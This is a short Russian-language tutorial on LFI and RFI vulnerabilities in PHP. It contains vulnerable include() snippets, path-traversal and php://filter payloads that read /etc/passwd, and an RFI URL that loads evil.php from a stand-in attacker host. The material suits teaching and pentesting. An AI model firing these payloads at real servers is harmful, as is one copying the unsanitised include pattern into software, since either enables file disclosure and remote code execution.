# Что  такое LFI?

Включение локального файла (LFI) позволяет злоумышленнику включать файлы на сервер через веб-браузер. Эта уязвимость существует, когда веб-приложение включает файл без правильной очистки ввода, позволяя злоумышленнику манипулировать вводом и 
вводить символы обхода пути и включать другие файлы с веб-сервера. 

С п.м LFI вы можете обходить катологи и прочитать другие файлы, а также запускать другие php файлы (если конечно вы знаете их называние).

Пример php-кода, уязвимого для LFI:

```php
<?php

    $file = $_GET[‘file’];
     ​
    if(isset($file)){
     
       include(“pages/$file”);
   ​ }
   ​ else{

       include(“index.php”);
      }
  
?>
```
    
Эксплуатировать эту уязвимость легко. Пример эксплуатации LFI:

```
Цель -->  https://example.com/?file=contact.php
Эксплуатация --> https://example.com/?module=/etc/passwd

Цель -->  /script.php?page=index.html
Эксплуатация -->  /script.php?page=../../../../../../../../etc/passwd
```

Как видно, мы можем читать данные которые не должны. Но если файл формата php или htmlб то он его не читает, а исполняет.

PHP-оболочки:
  В PHP есть несколько оболочек, которыми часто можно злоупотреблять для обхода различных входных фильтров. Их также называют wrapper или же обертки.
  
PHP php://filter:
  Фильтр php: // позволяет пентестеру включать локальные файлы, а base64 кодирует вывод. 
  Следовательно, любой вывод base64 необходимо будет декодировать, чтобы раскрыть содержимое:
  
  
    index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
  
  В результате вы получитае закодированную сожержимое base64, но его легко декодировать
  
  php: // filter также можно использовать без кодирования вывода base64, используя: 
    
      ?file=php://filter/resource=/etc/passwd
      
  В результате вы на странице получите содержимое /etc/passwd
  
Так почему мета-оболочка php://filter работает через url и его можно использовать как эксплойт для LFI?

если мы выполним вот такой код:

```php
include("php://filter/resource=index.php")
```

то наш код успешно выполнится и мы подключим файл index.php, так и в url. Помоему наверняка функция include() использует один из функции readfile(), file(), file_get_contents().
  

А еще есть такая узвимость как RFI (Remote File Include), он похож на LFI, но его уровень угрозы выше, потому что он может подключать не только локольные файлы, но и удалённые. Это даёт злоумышленнику подключать свои файлы.

Пример уязвимого PHP-кода:

```php
  $file = $_GET['file'];

  include($file);
```
  
И его эксплуатации:

```
http://example.com/?file=http://attacker.example.com/evil.php
```













































  